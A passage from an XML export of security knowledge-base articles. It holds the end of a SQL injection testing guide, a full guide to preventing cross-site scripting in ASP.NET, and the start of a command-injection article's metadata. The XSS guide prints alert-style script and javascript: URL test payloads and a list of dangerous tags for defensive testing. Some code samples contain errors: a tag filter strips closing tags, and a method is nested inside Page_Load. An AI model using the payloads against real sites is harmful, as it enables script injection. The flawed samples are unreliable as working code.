</p><p>Nevertheless, keep in mind that it is also important not to overdo payload testing.&nbsp; If you realize that a specific variable-entry point is not susceptible to SQL injection (it might be parameterized or escaped of its command characters) then move on to the next variable and not spend unnecessary time testing numerous payloads.&nbsp; </p><p><strong><em>NOTE:&nbsp; Use proper test monitors or indicators</em></strong></p><p>When testing injection, especially out of bands that opens a separate channel to send data back, make sure to have in indicator that waits for the test to pass or fail.&nbsp; If the payload opens a backdoor then connect to the backdoor.&nbsp;&nbsp; If the payload copies a database to a remote database then have that server set up and ready to receive the stolen data.&nbsp;&nbsp; Having proper indicators and monitors in place is the only way to find out the results of all test cases.</p><p><strong><em>Learn database structure and use to tune test cases</em></strong></p><p>In almost all information disclosure and tampering scenarios, the attacker will need to know table and column names.&nbsp;&nbsp; One way to successfully discover database details is to use error messages smartly.&nbsp;&nbsp; Another way to discover database structure such as table names and columns is to brute force table names or column names and look for valid ones.&nbsp; Finally, you can discover details about the database using inference techniques.</p><br><h1>Conclusions</h1><p>Good SQL Injection testing relies on proper coverage of all SQL related input variables through their different entry points.&nbsp; Start by understanding attack scenarios and doing a comprehensive analysis of the application's SQL related input variables, query construction, and entry points.&nbsp; Then try basic tests, tune the test data based on different entry points, and look carefully how the application reacts.&nbsp;&nbsp; Finally, tune your data using the appropriate payloads and keep tuning test case data with learned or inferred database structure.</p><h1>Additional Resources&nbsp;</h1><div><br></div><ul><li>Percent Encoding.&nbsp; Wikipedia. <a href="http://en.wikipedia.org/wiki/Percent-encoding">http://en.wikipedia.org/wiki/Percent-encoding</a> </li><li><a href="http://www.securitydocs.com/pdf/2656.PDF">SQL Injection:&nbsp; Are your Web Applications Vulnerable? Kevin Spett.&nbsp; Spi Dynamics.</a> </li><li><a href="http://www.appsecinc.com/presentations/Manipulating_SQL_Server_Using_SQL_Injection.pdf">Manipulating Microsoft SQL Server Using SQL&nbsp; Injection. Cesar Cerrudo. Application Security, Inc.</a> </li><li><a href="http://www.ngssoftware.com/papers/sqlinference.pdf">Data-mining with SQL Injection and Inference. &nbsp;David Litchfield.&nbsp; NGS Software.</a></li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:1D4FA7AF-33F0-40D9-9665-A31DBF3D7764">Attack: SQL Injection Attack</a></li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="714443521" Content_Hash="1711132889">
    <Metadata>
      <Id>7729f9db-bfae-4606-acab-4b80ec099a2f</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>How to Prevent Cross-Site Scripting in ASP.NET</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>How To</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Summary</h1><p>This How to shows how you can help protect your ASP.NET applications from cross-site scripting attacks by using proper input validation techniques and by encoding the output. It also describes a number of other protection mechanisms that you can use in addition to these two main countermeasures.</p><p>Cross-site scripting (XSS) attacks exploit vulnerabilities in Web page validation by injecting client-side script code. Common vulnerabilities that make your Web applications susceptible to cross-site scripting attacks include failing to properly validate input, failing to encode output, and trusting the data retrieved from a shared database. To protect your application against cross-site scripting attacks, assume that all input is malicious. Constrain and validate all input. Encode all output that could, potentially, include HTML characters. This includes data read from files and databases.</p><h1>Contents</h1><ul><li><div>Objectives</div></li><li><div>Overview</div></li><li><div>Summary of Steps</div></li><li><div>Step 1. Check That ASP.NET Request Validation Is Enabled</div></li><li><div>Step 2. Review ASP.NET Code That Generates HTML Output</div></li><li><div>Step 3. Determine Whether HTML Output Includes Input Parameters</div></li><li><div>Step 4. Review Potentially Dangerous HTML Tags and Attributes</div></li><li><div>Step 5. Evaluate Countermeasures</div></li><li><div>Additional Considerations</div></li><li><div>Additional Resources</div></li></ul><h1>Objectives</h1><ul><li>Understand the common cross-site scripting vulnerabilities in Web page validation. </li><li>Apply countermeasures for cross-site scripting attacks. </li><li>Constrain input by using regular expressions, type checks, and ASP.NET validator controls. </li><li>Constrain output to ensure the browser does not execute HTML tags that contain script code. </li><li>Review potentially dangerous HTML tags and attributes and evaluate countermeasures. </li></ul><h1>Overview</h1><p>Cross-site scripting attacks exploit vulnerabilities in Web page validation by injecting client-side script code. The script code embeds itself in response data, which is sent back to an unsuspecting user. The user's browser then runs the script code. Because the browser downloads the script code from a trusted site, the browser has no way of recognizing that the code is not legitimate, and Microsoft Internet Explorer security zones provide no defense. Cross-site scripting attacks also work over HTTP and HTTPS (SSL) connections. </p><p>One of the most serious examples of a cross-site scripting attack occurs when an attacker writes script to retrieve the authentication cookie that provides access to a trusted site and then posts the cookie to a Web address known to the attacker. This enables the attacker to spoof the legitimate user's identity and gain illicit access to the Web site.</p><p>Common vulnerabilities that make your Web application susceptible to cross-site scripting attacks include: </p><ul><li>Failing to constrain and validate input. </li><li>Failing to encode output. </li><li>Trusting data retrieved from a shared database. </li></ul><h2>Guidelines</h2><p>The two most important countermeasures to prevent cross-site scripting attacks are to: </p><ul><li><strong>Constrain input</strong>.<strong> </strong></li><li><strong>Encode output</strong>. </li></ul><h3>Constrain Input</h3><p>Start by assuming that all input is malicious. Validate input type, length, format, and range. </p><ul><li>To constrain input supplied through server controls, use ASP.NET validator controls such as <strong>RegularExpressionValidator</strong> and <strong>RangeValidator</strong>. </li><li>To constrain input supplied through client-side HTML input controls or input from other sources such as query strings or cookies, use the <strong>System.Text.RegularExpressions.Regex</strong> class in your server-side code to check for expected using regular expressions. </li><li>To validate types such as integers, doubles, dates, and currency amounts, convert the input data to the equivalent .NET Framework data type and handle any resulting conversion errors. </li></ul><h3>Encode Output</h3><p>Use the <strong>AntiXSSLibrary.HtmlEncode</strong> method to encode output if it contains input from the user or from other sources such as databases. <strong>HtmlEncode</strong> replaces characters that have special meaning in HTML-to-HTML variables that represent those characters. For example, &lt; is replaced with <strong>&amp;lt;</strong> and <strong>"</strong> is replaced with <strong>&amp;quot;</strong>. Encoded data does not cause the browser to execute code. Instead, the data is rendered as harmless HTML.</p><p>Similarly, use <strong>AntiXSSLibrary.UrlEncode</strong> to encode output URLs if they are constructed from input.</p><h1>Summary of Steps</h1><p>To prevent cross-site scripting, perform the following steps: </p><ul><li>Step 1. Check that ASP.NET request validation is enabled. </li><li>Step 2. Review ASP.NET code that generates HTML output. </li><li>Step 3. Determine whether HTML output includes input parameters. </li><li>Step 4. Review potentially dangerous HTML tags and attributes. </li><li>Step 5. Evaluate countermeasures. </li></ul><h1>Step 1. Check That ASP.NET Request Validation Is Enabled</h1><p>By default, request validation is enabled in Machine.config. Verify that request validation is currently enabled in your server's Machine.config file and that your application does not override this setting in its Web.config file. Check that <strong>validateRequest</strong> is set to <strong>true </strong>as shown in the following code example.</p><div><pre>&lt;system.web&gt;<br>&nbsp; &lt;pages buffer="true" validateRequest="true" /&gt;<br>&lt;/system.web&gt;  </pre></div><p>You can disable request validation on a page-by-page basis. Check that your pages do not disable this feature unless necessary. For example, you may need to disable this feature for a page if it contains a free-format, rich-text entry field designed to accept a range of HTML characters as input. </p><h2>To test that ASP.NET request validation is enabled </h2><ol><li>Create an ASP.NET page that disables request validation. To do this, set <strong>ValidateRequest="false"</strong>, as shown in the following code example. <div><pre>&lt;%@ Page Language="C#" ValidateRequest="false" %&gt;<br>&lt;html&gt;<br>&nbsp;&lt;script runat="server"&gt;<br>&nbsp; void btnSubmit_Click(Object sender, EventArgs e)<br>&nbsp; {<br>&nbsp;&nbsp;&nbsp; // If ValidateRequest is false, then 'hello' is displayed<br>&nbsp;&nbsp;&nbsp; // If ValidateRequest is true, then ASP.NET returns an exception<br>&nbsp;&nbsp;&nbsp; Response.Write(txtString.Text);<br>&nbsp; }<br>&nbsp;&lt;/script&gt;<br>&nbsp;&lt;body&gt;<br>&nbsp; &lt;form id="form1" runat="server"&gt;<br>&nbsp;&nbsp;&nbsp; &lt;asp:TextBox id="txtString" runat="server" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Text="&lt;script&gt;alert('hello');&lt;/script&gt;" /&gt;<br>&nbsp;&nbsp;&nbsp; &lt;asp:Button id="btnSubmit" runat="server"&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OnClick="btnSubmit_Click" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Text="Submit" /&gt;<br>&nbsp; &lt;/form&gt;<br>&nbsp;&lt;/body&gt;<br>&lt;/html&gt;  </pre></div></li><li>Run the page. It displays <strong>Hello</strong> in a message box because the script in <strong>txtString</strong> is passed through and rendered as client-side script in your browser. </li><li>Set <strong>ValidateRequest="true"</strong> or remove the <strong>ValidateRequest</strong> page attribute and browse to the page again. Verify that the following error message is displayed. <div><pre>A potentially dangerous Request.Form value was detected from the client (txtString="&lt;script&gt;alert('hello...").  </pre></div><p>This indicates that ASP.NET request validation is active and has rejected the input because it includes potentially dangerous HTML characters. </p><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;Do not rely on ASP.NET request validation. Treat it as an extra precautionary measure in addition to your own input validation.</blockquote></li></ol><h1><br>Step 2. Review ASP.NET Code That Generates HTML Output</h1><p>ASP.NET writes HTML as output in two ways, as shown in the following code examples.</p><div><pre>Response.Write<br>&lt;% = </pre></div><p>Search your pages to locate where HTML and URL output is returned to the client.</p><h1>Step 3. Determine Whether HTML Output Includes Input Parameters</h1><p>Analyze your design and your page code to determine whether the output includes any input parameters. These parameters can come from a variety of sources. The following list includes common input sources: </p><ul><li><strong>Form fields</strong>, such as the following. <div><pre>Response.Write(name.Text);<br>Response.Write(Request.Form["name"]);<br>Query Strings<br>Response.Write(Request.QueryString["name"]);  </pre></div></li><li><strong>Query strings</strong>, such as the following: <div><pre>Response.Write(Request.QueryString["username"]);  </pre></div></li><li><strong>Databases and data access methods</strong>, such as the following: <div><pre>SqlDataReader reader = cmd.ExecuteReader();<br>Response.Write(reader.GetString(1));  </pre></div><p>Be particularly careful with data read from a database if it is shared by other applications. </p></li><li><strong>Cookie collection</strong>, such as the following: <div><pre>Response.Write(<br>Request.Cookies["name"].Values["name"]);  </pre></div></li><li><strong>Session and application variables</strong>, such as the following: <div><pre>Response.Write(Session["name"]);<br>Response.Write(Application["name"]);  </pre></div></li></ul><p>In addition to source code analysis, you can also perform a simple test by typing text such as "<strong>XYZ</strong>" in form fields and testing the output. If the browser displays "<strong>XYZ</strong>" or if you see "<strong>XYZ</strong>" when you view the source of the HTML, your Web application is vulnerable to cross-site scripting. </p><p>To see something more dynamic, inject &lt;<strong>script</strong>&gt;<strong>alert('hello');</strong>&lt;<strong>/script</strong>&gt; through an input field. This technique might not work in all cases because it depends on how the input is used to generate the output.</p><h1>Step 4. Review Potentially Dangerous HTML Tags and Attributes</h1><p>If you dynamically create HTML tags and construct tag attributes with potentially unsafe input, make sure you HTML-encode the tag attributes before writing them out. </p><p>The following .aspx page shows how you can write HTML directly to the return page by using the &lt;<strong>asp:Literal</strong>&gt; control. The code takes user input of a color name, inserts it into the HTML sent back, and displays text in the color entered. The page uses <strong>HtmlEncode</strong> to ensure the inserted text is safe.</p><div><pre>&lt;%@ Page Language="C#" AutoEventWireup="true"%&gt;</pre><pre>&lt;html&gt;<br>&nbsp; &lt;form id="form1" runat="server"&gt;<br>&nbsp;&nbsp;&nbsp; &lt;div&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Color:&amp;nbsp;&lt;asp:TextBox ID="TextBox1" runat="server"&gt;&lt;/asp:TextBox&gt;&lt;br /&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:Button ID="Button1" runat="server" Text="Show color" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OnClick="Button1_Click" /&gt;&lt;br /&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:Literal ID="Literal1" runat="server"&gt;&lt;/asp:Literal&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/div&gt;<br>&nbsp; &lt;/form&gt;<br>&lt;/html&gt;</pre></div><pre>&lt;script runat="server"&gt;<br>&nbsp; private void Page_Load(Object Src, EventArgs e)<br>&nbsp; {<br>&nbsp;&nbsp;&nbsp; protected void Button1_Click(object sender, EventArgs e)<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Literal1.Text = @"&lt;span style=""color:" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; + Server.HtmlEncode(TextBox1.Text)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; + @"""&gt;Color example&lt;/span&gt;";<br>&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp; }<br>&lt;/Script&gt;</pre><h2>Potentially Dangerous HTML Tags</h2><p>While not an exhaustive list, the following commonly used HTML tags could allow a malicious user to inject script code: </p><ul><li>&lt;<strong>applet</strong>&gt; </li><li>&lt;<strong>body</strong>&gt; </li><li>&lt;<strong>embed</strong>&gt; </li><li>&lt;<strong>frame</strong>&gt; </li><li>&lt;<strong>script</strong>&gt; </li><li>&lt;<strong>frameset</strong>&gt; </li><li>&lt;<strong>html</strong>&gt; </li><li>&lt;<strong>iframe</strong>&gt; </li><li>&lt;<strong>img</strong>&gt; </li><li>&lt;<strong>style</strong>&gt; </li><li>&lt;<strong>layer</strong>&gt; </li><li>&lt;<strong>link</strong>&gt; </li><li>&lt;<strong>ilayer</strong>&gt; </li><li>&lt;<strong>meta</strong>&gt; </li><li>&lt;<strong>object</strong>&gt; </li></ul><p>An attacker can use HTML attributes such as <strong>src</strong>, <strong>lowsrc</strong>, <strong>style</strong>, and <strong>href</strong> in conjunction with the preceding tags to inject cross-site scripting. For example, the <strong>src</strong> attribute of the &lt;<strong>img</strong>&gt; tag can be a source of injection, as shown in the following examples.</p><div><pre>&lt;img src="javascript:alert('hello');"&gt;<br>&lt;img src="java&amp;#010;script:alert('hello');"&gt;<br>&lt;img src="java&amp;#X0A;script:alert('hello');"&gt;  </pre></div><p>An attacker can also use the &lt;<strong>style</strong>&gt; tag to inject a script by changing the MIME type as shown in the following.</p><div><pre>&lt;style TYPE="text/javascript"&gt;<br>&nbsp; alert('hello');<br>&lt;/style&gt;  </pre></div><h1>Step 5. Evaluate Countermeasures</h1><p>When you find ASP.NET code that generates HTML using some input, you need to evaluate appropriate countermeasures for your specific application. Countermeasures include: </p><ul><li>Encode HTML output. </li><li>Encode URL output. </li><li>Filter user input. </li></ul><h2>Encode HTML Output</h2><p>If you write text output to a Web page and you do not know if the text contains HTML special characters (such as &lt;, &gt;, and <strong>&amp;</strong>), pre-process the text by using the <strong>AntiXSSLibrary.HtmlEncode</strong> method as shown in the following code example. Do this if the text came from user input, a database, or a local file.</p><div><pre>Response.Write(AntiXSSLibrary.HtmlEncode(Request.Form["name"]));  </pre></div><p>Do not substitute encoding output for checking that input is well-formed and correct. Use it as an additional security precaution.</p><h2>Encode URL Output</h2><p>If you return URL strings that contain input to the client, use the <strong>AntiXSSLibrary.UrlEncode</strong> method to encode these URL strings as shown in the following code example.</p><div><pre>Response.Write(AntiXSSLibrary.UrlEncode(urlString));  </pre></div><h2>Filter User Input</h2><p>If you have pages that need to accept a range of HTML elements, for example through some kind of rich text input field, you must disable ASP.NET request validation for the page. If you have several pages that do this, create a filter that allows only the HTML elements that you want to accept. A common practice is to restrict formatting to safe HTML elements such as bold (&lt;<strong>b</strong>&gt;) and italic (&lt;<strong>i</strong>&gt;).</p><h3>To safely allow restricted HTML input </h3><ol><li>Disable ASP.NET request validation by the adding the <strong>ValidateRequest="false"</strong> attribute to the <strong>@ Page</strong> directive. </li><li>Encode the string input with the <strong>HtmlEncode</strong> method. </li><li>Use a <strong>StringBuilder</strong> and call its <strong>Replace</strong> method to selectively remove the encoding on the HTML elements that you want to permit. </li></ol><p>The following .aspx page code shows this approach. The page disables ASP.NET request validation by setting <strong>ValidateRequest="false"</strong>. It HTML-encodes the input and then selectively allows the &lt;<strong>b</strong>&gt; and &lt;<strong>i</strong>&gt; HTML elements to support simple text formatting. </p><div><pre>&lt;%@ Page Language="C#" ValidateRequest="false"%&gt;</pre><pre>&lt;script runat="server"&gt;</pre><pre>&nbsp; void submitBtn_Click(object sender, EventArgs e)<br>&nbsp; {<br>&nbsp;&nbsp;&nbsp; // Encode the string input<br>&nbsp;&nbsp;&nbsp; StringBuilder sb = new StringBuilder(<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; AntiXSSLibrary.HtmlEncode(htmlInputTxt.Text));<br>&nbsp;&nbsp;&nbsp; // Selectively allow&nbsp; &lt;b&gt; and &lt;i&gt;<br>&nbsp;&nbsp;&nbsp; sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;");<br>&nbsp;&nbsp;&nbsp; sb.Replace("&amp;lt;/b&amp;gt;", "");<br>&nbsp;&nbsp;&nbsp; sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;");<br>&nbsp;&nbsp;&nbsp; sb.Replace("&amp;lt;/i&amp;gt;", "");<br>&nbsp;&nbsp;&nbsp; Response.Write(sb.ToString());<br>&nbsp; }<br>&lt;/script&gt;</pre></div><pre>&lt;html&gt;<br>&nbsp; &lt;body&gt;<br>&nbsp;&nbsp;&nbsp; &lt;form id="form1" runat="server"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;div&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:TextBox ID="htmlInputTxt" Runat="server" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TextMode="MultiLine" Width="318px"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Height="168px"&gt;&lt;/asp:TextBox&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:Button ID="submitBtn" Runat="server" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Text="Submit" OnClick="submitBtn_Click" /&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/div&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/form&gt;<br>&nbsp; &lt;/body&gt;<br>&lt;/html&gt;</pre><h1>Additional Considerations</h1><p>In addition to the techniques discussed previously in this How to, use the following countermeasures as further safe guards to prevent cross-site scripting: </p><ul><li>Set the correct character encoding. </li><li>Do not rely on input sanitization. </li><li>Use the HttpOnly cookie option. </li><li>Use the &lt;frame&gt; security attribute. </li><li>Use the innerText property instead of innerHTML. </li></ul><h2>Set the Correct Character Encoding</h2><p>To successfully restrict valid data for your Web pages, you should limit the ways in which the input data can be represented. This prevents malicious users from using canonicalization and multi-byte escape sequences to trick your input validation routines. A multi-byte escape sequence attack is a subtle manipulation that uses the fact that character encodings, such as uniform translation format-8 (UTF-8), use multi-byte sequences to represent non-ASCII characters. Some byte sequences are not legitimate UTF-8, but they may be accepted by some UTF-8 decoders, thus providing an exploitable security hole.</p><p>ASP.NET allows you to specify the character set at the page level or at the application level by using the &lt;<strong>globalization</strong>&gt; element in the Web.config file. The following code examples show both approaches and use the ISO-8859-1 character encoding, which is the default in early versions of HTML and HTTP.</p><p>To set the character encoding at the page level, use the &lt;<strong>meta</strong>&gt; element or the <strong>ResponseEncoding</strong> page-level attribute as follows: </p><div><pre>&lt;meta http-equiv="Content Type" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; content="text/html; charset=ISO-8859-1" /&gt;</pre><pre>OR<br>&lt;% @ Page ResponseEncoding="iso-8859-1" %&gt;  </pre></div><p>To set the character encoding in the Web.config file, use the following configuration.</p><div><pre>&lt;configuration&gt;<br>&nbsp;&nbsp; &lt;system.web&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;globalization <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; requestEncoding="iso-8859-1"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; responseEncoding="iso-8859-1"/&gt;<br>&nbsp;&nbsp; &lt;/system.web&gt;<br>&lt;/configuration&gt;  </pre></div><h2>Validating Unicode Characters</h2><p>Use the following code to validate Unicode characters in a page.</p><div><pre>using System.Text.RegularExpressions;<br>. . .</pre><pre>public class WebForm1 : System.Web.UI.Page<br>{<br>&nbsp; private void Page_Load(object sender, System.EventArgs e)<br>&nbsp; {<br>&nbsp;&nbsp;&nbsp; // Name must contain between 1 and 40 alphanumeric characters<br>&nbsp;&nbsp;&nbsp; // and (optionally) special characters such as apostrophes&nbsp; <br>&nbsp;&nbsp;&nbsp; // for names such as O'Dell</pre><pre>&nbsp;&nbsp;&nbsp; if (!Regex.IsMatch(Request.Form["name"],<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @"^[\p{L}\p{Zs}\p{Lu}\p{Ll}\']{1,40}$"))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; throw new ArgumentException("Invalid name parameter");</pre><pre>&nbsp;&nbsp;&nbsp; // Use individual regular expressions to validate other parameters<br>&nbsp;&nbsp;&nbsp; . . .<br>&nbsp; }<br>}  </pre></div><p>The following explains the regular expression shown in the preceding code: </p><ul><li><strong>^</strong> means start looking at this position. </li><li><strong>\p{ ..}</strong> matches any character in the named character class specified by <strong>{..}</strong>. </li><li><strong>{L}</strong> performs a left-to-right match. </li><li><strong>{Lu}</strong> performs a match of uppercase. </li><li><strong>{Ll}</strong> performs a match of lowercase. </li><li><strong>{Zs}</strong> matches separator and space. </li><li><strong>'</strong>matches apostrophe. </li><li><strong>{1,40}</strong> specifies the number of characters: no less than 1 and no more than 40. </li><li>$ means stop looking at this position. </li></ul><h2>Do Not Rely on Input Sanitization</h2><p>A common practice is for code to attempt to sanitize input by filtering out known unsafe characters. Do not rely on this approach because malicious users can usually find an alternative means of bypassing your validation. Instead, your code should check for known secure, safe input. Table 1 shows various safe ways to represent some common characters.</p><p><strong>Table 1: Character Representation</strong></p><div><table><tbody><tr><th>Characters</th><th>Decimal</th><th>Hexadecimal</th><th>HTML Character Set</th><th>Unicode</th></tr><tr><td><strong>" </strong>(double quotation marks)</td><td>&amp;#34</td><td>&amp;#x22</td><td>&amp;quot;</td><td>\u0022</td></tr><tr><td><strong>' </strong>(single quotation mark)</td><td>&amp;#39</td><td>&amp;#x27</td><td>&amp;apos;</td><td>\u0027</td></tr><tr><td><strong>&amp;</strong> (ampersand)</td><td>&amp;#38</td><td>&amp;#x26</td><td>&amp;amp;</td><td>\u0026</td></tr><tr><td>&lt; (less than)</td><td>&amp;#60</td><td>&amp;#x3C</td><td>&amp;lt;</td><td>\u003c</td></tr><tr><td>&gt; (greater than)</td><td>&amp;#62</td><td>&amp;#x3E</td><td>&amp;gt;</td><td>\u003e</td></tr></tbody></table></div><br><h2>Use the HttpOnly Cookie Option</h2><p>Internet Explorer 6 Service Pack 1 and later supports an <strong>HttpOnly</strong> cookie attribute, which prevents client-side scripts from accessing a cookie from the <strong>document.cookie</strong> property. Instead, the script returns an empty string. The cookie is still sent to the server whenever the user browses to a Web site in the current domain.</p><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;Web browsers that do not support the <strong>HttpOnly</strong> cookie attribute either ignore the cookie or ignore the attribute, which means that it is still subject to cross-site scripting attacks.<strong> </strong></blockquote><p>The <strong>System.Net.Cookie</strong> class in Microsoft .NET Framework version 2.0 supports an <strong>HttpOnly</strong> property. The <strong>HttpOnly</strong> property is always set to true by Forms authentication. </p><p>Earlier versions of the .NET Framework (versions 1.0 and 1.1) require that you add code similar to the following to the <strong>Application</strong>_<strong>EndRequest</strong> event handler in your application Global.asax file to explicitly set the <strong>HttpOnly</strong> attribute.</p><div><pre>protected void Application_EndRequest(Object sender, EventArgs e) <br>{<br>&nbsp; string authCookie = FormsAuthentication.FormsCookieName;<br>&nbsp; foreach (string sCookie in Response.Cookies) <br>&nbsp; {<br>&nbsp;&nbsp;&nbsp; // Just set the HttpOnly attribute on the Forms <br>&nbsp;&nbsp;&nbsp; // authentication cookie. Skip this check to set the attribute <br>&nbsp;&nbsp;&nbsp; // on all cookies in the collection</pre></div><pre>&nbsp;&nbsp;&nbsp; if (sCookie.Equals(authCookie))<br>&nbsp;&nbsp;&nbsp; { <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Force HttpOnly to be added to the cookie header<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Response.Cookies[sCookie].Path += ";HttpOnly";<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp; }<br>}</pre><h2>Use the &lt;frame&gt; Security Attribute</h2><p>Internet Explorer 6 and later support a new <strong>security</strong> attribute for the &lt;<strong>frame</strong>&gt; and &lt;<strong>iframe</strong>&gt; elements. You can use the <strong>security</strong> attribute to apply the user's Restricted Sites Internet Explorer security zone settings to an individual frame or iframe. By default, the Restricted Sites zone does not support script execution. </p><p>If you use the <strong>security</strong> attribute, it must be set to <strong>"restricted"</strong> as shown in the following.</p><div><div><div></div><div>&nbsp;</div></div><pre>&lt;frame security="restricted" src="http://www.somesite.com/somepage.htm"&gt;&lt;/frame&gt;  </pre></div><h2>Use the innerText Property Instead of innerHTML</h2><p>If you use the <strong>innerHTML</strong> property to build a page and the HTML is based on potentially untrusted input, you must use <strong>HtmlEncode</strong> to make it safe. To avoid having to remember to do this, use <strong>innerText</strong> instead. The <strong>innerText</strong> property renders content safe and ensures that scripts are not executed.</p><p>The following example shows this approach for two HTML &lt;<strong>span</strong>&gt; controls. The code in the <strong>Page_Load</strong> method sets the text displayed in the <strong>Welcome1</strong> &lt;<strong>span</strong>&gt; element using the <strong>innerText</strong> property, so HTML-encoding is unnecessary. The code sets the text in the <strong>Welcome2</strong> &lt;<strong>span</strong>&gt; element by using the <strong>innerHtml</strong> property; therefore, you must <strong>HtmlEncode</strong> it first to make it safe.</p><div><pre>&lt;%@ Page Language="C#" AutoEventWireup="true"%&gt;</pre><pre>&lt;html&gt;<br>&nbsp; &lt;body&gt;<br>&nbsp;&nbsp;&nbsp; &lt;span id="Welcome1" runat="server"&gt; &lt;/span&gt;<br>&nbsp;&nbsp;&nbsp; &lt;span id="Welcome2" runat="server"&gt; &lt;/span&gt;<br>&nbsp; &lt;/body&gt;<br>&lt;/html&gt;</pre></div><pre>&lt;script runat="server"&gt;<br>&nbsp; private void Page_Load(Object Src, EventArgs e)<br>&nbsp; {<br>&nbsp;&nbsp;&nbsp; // Using InnerText renders the content safe-no need to HtmlEncode<br>&nbsp;&nbsp;&nbsp; Welcome1.InnerText = "Hello, " + User.Identity.Name;</pre><pre>&nbsp;&nbsp;&nbsp; // Using InnerHtml requires the use of HtmlEncode to make it safe<br>&nbsp;&nbsp;&nbsp; Welcome2.InnerHtml = "Hello, " + <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Server.HtmlEncode(User.Identity.Name);<br>&nbsp; }<br>&lt;/Script&gt;</pre><hr><p>Adapted from Microsoft patterns &amp; practices guidance.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1856655336" Content_Hash="-159156809">
    <Metadata>
      <Id>820d595d-b22c-4e7e-b8c2-104eb854d929</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>How to Test for Command Injection Bugs</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Test</Phase>
      <Technology> Any</Technology>
      <Type>How To</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author>Andres De Vivanco</Author>
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
